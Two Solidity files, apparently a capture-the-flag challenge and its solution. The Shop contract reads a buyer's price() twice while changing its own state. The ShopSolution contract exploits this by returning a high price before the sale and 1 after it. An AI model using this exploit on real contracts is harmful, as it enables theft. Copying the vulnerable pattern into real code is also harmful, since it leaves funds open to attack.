// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Task.sol';

contract ShopSolution {

    Shop public victim;

    constructor(address _shop) {
        victim = Shop(_shop);

    }

    function price() external view returns (uint256 myPrice) {
        if (victim.isSold()) {
            myPrice = 1;
        } else {
            myPrice = 2000;
        }    
    }

    function buy() public {
        victim.buy();
    }

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}